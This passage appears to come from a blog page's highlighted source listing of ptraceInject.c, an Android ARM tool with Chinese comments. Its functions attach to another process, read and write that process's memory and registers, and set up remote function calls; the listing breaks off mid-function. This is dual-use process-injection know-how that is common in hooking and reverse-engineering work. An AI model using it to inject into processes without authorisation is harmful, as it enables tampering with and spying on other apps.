class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: ptraceInject.c</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ptraceInject.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK     ( 1u &lt;&lt; 5 )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOTE_ADDR( addr, local_base, remote_base ) ( (uint32_t)(addr) + (uint32_t)(remote_base) - (uint32_t)(local_base) ) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *libc_path = <span class="string">"/system/lib/libc.so"</span>;    </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *linker_path = <span class="string">"/system/bin/linker"</span>;   </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    ptrace使远程进程继续运行</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示continue成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_continue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"ptrace cont error, pid:%d"</span>, pid);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace Attach到指定进程</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示attach成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span>  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_attach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"attach process error, pid:%d"</span>, pid);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">	</span><br><span class="line"> 	LOGD(<span class="string">"attach process pid:%d"</span>, pid);          </span><br><span class="line">    waitpid(pid, &amp;status , WUNTRACED);       	</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace detach指定进程</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示detach成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span>    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_detach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"detach process error, pid:%d"</span>, pid);     </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">	LOGD(<span class="string">"detach process pid:%d"</span>, pid);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace获取远程进程的寄存器值</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储了寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示获取寄存器成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_getregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Get Regs error, pid:%d"</span>, pid);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace设置远程进程的寄存器值</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储需要修改的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示设置寄存器成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Set Regs error, pid:%d"</span>, pid);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取返回值，ARM处理器中返回值存放在ARM_r0寄存器中</span></span><br><span class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         在ARM处理器下返回r0寄存器值</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getret</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_r0;      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取当前执行代码的地址，ARM处理器下存放在ARM_pc中</span></span><br><span class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         在ARM处理器下返回pc寄存器值</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getpc</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_pc;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace从远程进程内存中读取数据</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，pSrcBuf表示从远程进程读取数据的内存地址</span></span><br><span class="line"><span class="comment">				  pDestBuf表示用于存储读取出数据的地址，size表示读取数据的大小</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示读取数据成功</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_readdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pSrcBuf, <span class="keyword">uint8_t</span> *pDestBuf, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> nReadCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint8_t</span> *pCurSrcBuf = pSrcBuf;</span><br><span class="line">	<span class="keyword">uint8_t</span> *pCurDestBuf = pDestBuf;</span><br><span class="line">	<span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> i = <span class="number">0</span>;	</span><br><span class="line"> </span><br><span class="line">	nReadCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">	nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nReadCount; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">		pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">		pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( nRemainCount &gt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), nRemainCount);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace将数据写入到远程进程空间中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，pWriteAddr表示写入数据到远程进程的内存地址</span></span><br><span class="line"><span class="comment">				  pWriteData用于存储写入数据的地址，size表示写入数据的大小</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示写入数据成功，返回-1表示写入数据失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_writedata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pWriteAddr, <span class="keyword">uint8_t</span> *pWriteData, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> nWriteCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint8_t</span> *pCurSrcBuf = pWriteData;</span><br><span class="line">	<span class="keyword">uint8_t</span> *pCurDestBuf = pWriteAddr;</span><br><span class="line">	<span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	nWriteCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">	nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 先讲数据以sizeof(long)字节大小为单位写入到远程进程内存空间中</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nWriteCount; i ++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)  <span class="comment">// PTRACE_POKETEXT表示从远程内存空间写入一个sizeof(long)大小的数据</span></span><br><span class="line">		&#123;</span><br><span class="line">			LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">		pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 将剩下的数据写入到远程进程内存空间中</span></span><br><span class="line">	<span class="keyword">if</span> (nRemainCount &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurDestBuf, <span class="literal">NULL</span>); <span class="comment">//先取出原内存中的数据，然后将要写入的数据以单字节形式填充到低字节处</span></span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, nRemainCount);</span><br><span class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    使用ptrace远程call函数</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，ExecuteAddr为远程进程函数的地址</span></span><br><span class="line"><span class="comment">                  parameters为函数参数的地址，regs为远程进程call函数前的寄存器环境</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示call函数成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> ExecuteAddr, <span class="keyword">long</span> *parameters, <span class="keyword">long</span> num_params, struct pt_regs* regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// ARM处理器，函数传递参数，将前四个参数放到r0-r3，剩下的参数压入栈中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;    </span><br><span class="line">        regs-&gt;uregs[i] = parameters[i];    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;    </span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    <span class="comment">// 分配栈空间，栈的方向是从高地址到低地址</span></span><br><span class="line">        <span class="keyword">if</span> (ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;ARM_sp, (<span class="keyword">uint8_t</span> *)&amp;parameters[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>))  == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    regs-&gt;ARM_pc = ExecuteAddr;           <span class="comment">//设置ARM_pc寄存器为需要调用的函数地址</span></span><br><span class="line">    <span class="comment">// 与BX跳转指令类似，判断跳转的地址位[0]是否为1，如果为1，则将CPST寄存器的标志T置位，解释为Thumb代码</span></span><br><span class="line">	<span class="comment">// 若为0，则将CPSR寄存器的标志T复位，解释为ARM代码</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;    </span><br><span class="line">        <span class="comment">/* thumb */</span>    </span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);    </span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="comment">/* arm */</span>    </span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span> || ptrace_continue(pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        LOGD(<span class="string">"ptrace set regs or continue error, pid:%d"</span>, pid);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line">	<span class="comment">// 对于使用ptrace_cont运行的子进程，它会在3种情况下进入暂停状态：①下一次系统调用；②子进程退出；③子进程的执行发生错误。</span></span><br><span class="line">	<span class="comment">// 参数WUNTRACED表示当进程进入暂停状态后，立即返回</span></span><br><span class="line">	<span class="comment">// 将ARM_lr（存放返回地址）设置为0，会导致子进程执行发生错误，则子进程进入暂停状态</span></span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 判断是否成功执行函数</span></span><br><span class="line">    LOGD(<span class="string">"ptrace call ret status is %d\n"</span>, stat); </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> 